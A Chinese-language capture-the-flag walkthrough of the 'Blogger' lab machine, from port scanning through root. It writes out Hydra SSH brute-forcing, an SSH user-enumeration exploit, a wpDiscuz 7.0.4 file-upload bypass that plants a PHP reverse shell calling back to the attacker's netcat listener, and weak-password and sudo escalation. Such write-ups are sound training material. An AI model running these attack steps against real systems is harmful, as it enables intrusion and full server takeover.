# Esay_Blogger

## 总结

getwebshell → 目录扫描 → CMS指纹扫描 → 漏洞发现

提 权 思 路 → 用户弱密码 → sudo su提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.176`

![](https://image.3001.net/images/20230723/1690056624_64bc37b036841bda663ae.png!small)

  * 启动靶机  
获取目标机器IP > `192.168.190.217`

![](https://image.3001.net/images/20230723/1690056625_64bc37b14c1d036ed3b2a.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    ┌──(root㉿Kali)-[/home/bachang/Blogger]
    └─# sudo nmap --min-rate 10000 -p- 192.168.190.217
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-23 02:25 CST
    Nmap scan report for 192.168.190.217
    Host is up (0.25s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    

![](https://image.3001.net/images/20230723/1690056626_64bc37b2215bd74c4db1a.png!small)

> [!通过各两次扫描收集到端口 ]  
> 22,80

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80 192.168.190.217
    

![](https://image.3001.net/images/20230723/1690056627_64bc37b31358edf548fa2.png!small)

## 信息收集-端口测试

目前22端口和80端口开放，分别进行尝试

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用(鸡肋)

通过`Nmap`探测获得`SSH`的版本信息，可以尝试利用

    
    
    # 进入msf  探测版本为OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
    console
    # 搜索对应脚本
    msf6 > searchsploit openssh 7.2
    

发现我们的`OpenSSH 7.2p2`是存在用户名枚举的漏洞

![](https://image.3001.net/images/20230723/1690056629_64bc37b57c3bf3c08a13c.png!small)

#### 漏洞利用-SSH用户名枚举(麻烦)

    
    
    # 查看msf对应的内容
    cat /usr/share/exploitdb/exploits/linux/remote/40136.py
    

![](https://image.3001.net/images/20230723/1690056630_64bc37b6a83f00cf06b8f.png!small)  
查看脚本初步确定使用方法

![](https://image.3001.net/images/20230723/1690056631_64bc37b7c5045f729b30b.png!small)  
输入ip指定用户名或者用户列表进行枚举

    
    
    python /usr/share/exploitdb/exploits/linux/remote/40136.py 192.168.190.217 -U /usr/share/wordlists/metasploit/password.lst
    

有点鸡肋，放弃

![](https://image.3001.net/images/20230723/1690056632_64bc37b8d77c5017a9d67.png!small)

#### 22-SSH弱口令爆破(不支持)

尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.190.217 ssh -s 22
    

发现目标不支持密码连接

![](https://image.3001.net/images/20230723/1690056634_64bc37ba3034aae1df494.png!small)

#### 22-SSH手动登录尝试(拒绝)

尝试`root`账户的密码爆破发现报错之后进行手动尝试

    
    
    ssh root@192.168.190.217 -p 22
    # 密码尝试
    password > root
    

发现目标不支持密码连接  
![](https://image.3001.net/images/20230723/1690056635_64bc37bb32eace5981c84.png!small)

### 80-HTTP端口的信息收集

接下来只能通过80端口进行突破了  
访问 http://192.168.190.217:80 看上去是个标准的`cms`  
![](https://image.3001.net/images/20230723/1690056636_64bc37bc54ecd12644271.png!small)

#### 信息收集-网站指纹

    
    
    ┌──(root㉿Kali)-[/home/bachang/Blogger]
    └─# whatweb http://192.168.190.217:80 
    http://192.168.190.217:80 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,mail@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.190.217], JQuery[2.2.3], PasswordField, Script, Title[Blogger | Home]
    

可能CMS是`Blogger`? 不清楚版本信息先不考虑网站指纹

![](https://image.3001.net/images/20230723/1690056637_64bc37bd5f5e17ca180ca.png!small)

#### 信息收集-源码查看

    
    
    # 利用html2text转换纯文本方便查看
    curl http://192.168.190.217:80  | html2text
    

查看了一下没找到什么有用的信息

![](https://image.3001.net/images/20230723/1690056638_64bc37be47f15771a1053.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.190.217:80 -x 302,403
    

因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

![](https://image.3001.net/images/20230723/1690056639_64bc37bf44407dbaf5436.png!small)

#### 信息收集-端点查看

##### /assets端点查看(文件遍历)

访问了该端点之后发现了路径遍历

![](https://image.3001.net/images/20230723/1690056640_64bc37c03e1a9914b42e5.png!small)  
点击查看发现是文件遍历

![](https://image.3001.net/images/20230723/1690056641_64bc37c14eaf4db6c96f1.png!small)

可以尝试对该端点进行 `-r`递归扫描

    
    
    dirsearch -u http://192.168.190.217:80/assets -x 302,403 -r 2
    

在该端点下发现一个比较感兴趣的文件夹`/blog`

![](https://image.3001.net/images/20230723/1690056642_64bc37c29f42a8f87ad8e.png!small)  
访问之后加载较慢，访问了域名

![](https://image.3001.net/images/20230723/1690056643_64bc37c3b2af3e003e8a9.png!small)  
发现会从ip跳转到域名

![](https://image.3001.net/images/20230723/1690056644_64bc37c4a995103e00d1f.png!small)  
因此进行`hosts`绑定

##### host绑定

发现访问IP被重定向，修改host

    
    
    vim /etc/hosts
    192.168.190.217 blogger.thm
    

![](https://image.3001.net/images/20230723/1690056645_64bc37c599e47f01b1366.png!small)

#### 信息收集-/assets/fonts/blog端点

再次访问发现加载正常

![](https://image.3001.net/images/20230723/1690056646_64bc37c6822b525cc36f5.png!small)

##### 信息收集-网站指纹

    
    
    whatweb http://192.168.190.217/assets/fonts/blog/
    

发现运用了`WordPress 4.9.8`

![](https://image.3001.net/images/20230723/1690056647_64bc37c7943c5502cbea0.png!small)

##### 漏洞利用-网站指纹

    
    
    msfconsole
    searchsploit WordPress 4.9.8
    

搜索发现主要是和插件有关，需要探索插件

![](https://image.3001.net/images/20230723/1690056648_64bc37c899bff4d9ac204.png!small)

##### 信息收集-漏洞扫描wpscan

    
    
    # 针对wordpress的专用扫描器
    wpscan --url http://192.168.190.217/assets/fonts/blog/
    

通过`wpscan`发现了很多漏洞，比较严重的和上传有关

![](https://image.3001.net/images/20230723/1690056649_64bc37c9d485bea30eb50.png!small)

## 漏洞利用-getwebshell

### 文件上传getwebshell

访问`wpscan`扫描出来的功能点发现是路径遍历

![](https://image.3001.net/images/20230723/1690056651_64bc37cb2328bad03cf5b.png!small)  
推测存在文件上传功能，试试wp的各个功能点

发现了一处发表评论的功能点，可以上传图片

![](https://image.3001.net/images/20230723/1690056652_64bc37cc0074e19e8c7df.png!small)  
这时候查看源码，是否可以确认这是wordpress的哪个组件  
发现引用了`wpdiscuz`的组件

![](https://image.3001.net/images/20230723/1690056652_64bc37cccf1b4c024bb48.png!small)  
上传之后发现版本信息是 7.0.4

![](https://image.3001.net/images/20230723/1690056654_64bc37ce04c5db9c88fa9.png!small)

    
    
    # 直接上msf查找
    msf6 > searchsploit wpdiscuz 7.0.4
    

#### msf-rb失败

发现存在插件的上传，尝试利用msf

![](https://image.3001.net/images/20230723/1690056654_64bc37cef1e4b04bf4c85.png!small)

    
    
    msf6 > search wpdiscuz
    
    Matching Modules
    ================
    
       #  Name                                                         Disclosure Date  Rank       Check  Description
       -  ----                                                         ---------------  ----       -----  -----------       0  exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload  2020-02-21       excellent  Yes    WordPress wpDiscuz Unauthenticated File Upload Vulnerability
    
    
    Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_wpdiscuz_unauthenticated_file_upload
    
    msf6 > use 0
    

![](https://image.3001.net/images/20230723/1690056656_64bc37d01ecf4b6f4e5b2.png!small)

    
    
    show options
    

设置需要修改的参数

![](https://image.3001.net/images/20230723/1690056657_64bc37d11b9b562bc2d59.png!small)

    
    
    msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set lhost 192.168.45.176
    lhost => 192.168.45.176
    msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set rhosts 192.168.190.217
    rhosts => 192.168.190.217
    msf6 exploit(unix/webapp/wp_wpdiscuz_unauthenticated_file_upload) > set blogpath /assets/fonts/blog/?p=9
    blogpath => /assets/fonts/blog/?p=9
    

#### msf第二次尝试(失败)

尝试另外两个脚本

    
    
    cat /usr/share/exploitdb/exploits/php/webapps/49967.py
    cat /usr/share/exploitdb/exploits/php/webapps/49962.sh
    

py脚本需要确定地址和路径

![](https://image.3001.net/images/20230723/1690056658_64bc37d214089755afcd1.png!small)

    
    
    python /usr/share/exploitdb/exploits/php/webapps/49967.py -u http://192.168.190.217/assets/fonts/blog -p wp-content/uploads/2023/07/blogpost
    

#### 手动文章复现

网上直接搜索了相关的文章

![](https://image.3001.net/images/20230723/1690056659_64bc37d32eb8e0104e814.png!small)  
上传一个`shell.jpg`文件，此文件是`shell.php`更改了后缀的，再利用`BurpSuite`抓包  
添加`GIF89a`的头部获得上传路径

![](https://image.3001.net/images/20230723/1690056660_64bc37d41fefb8a0498bd.png!small)

##### 反弹shell-php

    
    
    # 利用cp命令cp一个到当前文件夹
    sudo cp /usr/share/webshells/php/php-reverse-shell.php .
    # 修改成jgp
    cp php-reverse-shell.php ./shell.jpg
    # 修改里面的监听端口
    

![](https://image.3001.net/images/20230723/1690056660_64bc37d4cc7f1569f3065.png!small)

    
    
    # 开启监听
    nc -lvvp 1234
    

上传抓包，准备修改

![](https://image.3001.net/images/20230723/1690056661_64bc37d5c87be68194849.png!small)  
添加`GIF89a`的头部获得上传路径，改为`shell.php`

![](https://image.3001.net/images/20230723/1690056663_64bc37d79b6914a353d47.png!small)  
通过日志找到对应的上传点

![](https://image.3001.net/images/20230723/1690056664_64bc37d8d753a48e8a4c2.png!small)  
访问地址之后成功`getwebshell`

![](https://image.3001.net/images/20230723/1690056665_64bc37d9edef3aaec6159.png!small)

## 内网遨游-getshell

### 交互shell-python

由于获取的shell交互不友好，利用python获得新的交互shell

    
    
    # 利用python获取交互shell -> python失败使用python3
    python -c "import pty;pty.spawn('/bin/bash')";
    python3 -c "import pty;pty.spawn('/bin/bash')";
    

说明系统内是`python3`

![](https://image.3001.net/images/20230723/1690056667_64bc37db8daa0319efc29.png!small)

### FLAG1获取

    
    
    www-data@ubuntu-xenial:/$ find / -name local.txt 2>/dev/null
    /home/james/local.txt
    www-data@ubuntu-xenial:/$ cat /home/james/local.txt
    **************************
    

![](https://image.3001.net/images/20230723/1690056668_64bc37dca237635704ab0.png!small)

### 权限提升

#### Linux提权-sudo提权尝试(需要密码)

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    www-data@ubuntu-xenial:/$ sudo -l
    [sudo] password for www-data:
    

![](https://image.3001.net/images/20230723/1690056669_64bc37dd8878b64d0930a.png!small)

### Linux提权-suid提权尝试

    
    
    # -perm 文件权限
    find / -perm -u=s -type f 2>/dev/null
    

![](https://image.3001.net/images/20230723/1690056670_64bc37de6bbf40e7c2c79.png!small)  
没找到什么适合的

### Linux提权-suid-getcap提权尝试

    
    
    # 探查有CAP_SETUID标志的进程
    /usr/sbin/getcap -r / 2>/dev/null
    

![](https://image.3001.net/images/20230723/1690056671_64bc37df664435328e3ee.png!small)

### Linux提权-Cron job提权尝试

    
    
    # 寻找定时任务并修改进行提权
    cat /etc/crontab
    

![](https://image.3001.net/images/20230723/1690056672_64bc37e0374faa2ac9b74.png!small)

### Linux提权-内核overlayfs提权尝试

    
    
    # 确定发行版本
    lsb_release -a
    # Ubuntu 16.04.7 LTS 不符合
    

### Linux提权-内核脏牛提权尝试

    
    
    # 确定发行版本  Ubuntu 16.04.7 LTS 符合
    lsb_release -a
    # 首先确定内核版本 4.4.0-206 不符合
    uname -a
    

### Linux提权-查找可读可写可执行root权限进程尝试

手动查看root的进程，查找可以权限提升内容

    
    
    # 调整行列，方便查询进程
    stty rows 50 cols 250
    # 查找进程，是否存在root权限进程
    ps aux
    

### 信息收集-内网基础信息收集

#### 确认home目录下用户

    
    
    ls -al /home
    

![](https://image.3001.net/images/20230723/1690056673_64bc37e11e6032f5fa656.png!small)

##### 确认home目录下是否有隐藏文件

    
    
    # 例如.ssh找密码  ./*_history找历史记录等
    ls -al /home/james
    

#### 暴力破解-内网用户密码弱口令

尝试直接用用户的账号当密码进行登录(因为不能利用hyrda远程爆破)

    
    
    www-data@ubuntu-xenial:/home/vagrant$ su ubuntu
    su ubuntu
    Password: ubuntu
    
    su: Authentication failure
    www-data@ubuntu-xenial:/home/vagrant$ su vagrant
    su vagrant
    Password: vagrant
    
    vagrant@ubuntu-xenial:~$
    

![](https://image.3001.net/images/20230723/1690056673_64bc37e1e3469fe50f3df.png!small)

### 提权-2

之后进行第二轮提权

#### Linux提权-sudo提权尝试

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    vagrant@ubuntu-xenial:~$ sudo -l
    sudo -l
    Matching Defaults entries for vagrant on ubuntu-xenial:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User vagrant may run the following commands on ubuntu-xenial:
        (ALL) NOPASSWD: ALL
    

存在`(ALL) NOPASSWD: ALL`

    
    
    # su提权
    vagrant@ubuntu-xenial:~$ sudo su
    sudo su
    root@ubuntu-xenial:/home/vagrant#
    

提权成功

![](https://image.3001.net/images/20230723/1690056675_64bc37e3048b3e8559da2.png!small)

### FLAG2获取

    
    
    cat /root/proof.txt
    *************************
    

完结撒花~

![](https://image.3001.net/images/20230723/1690056675_64bc37e3f30582910940a.png!small)

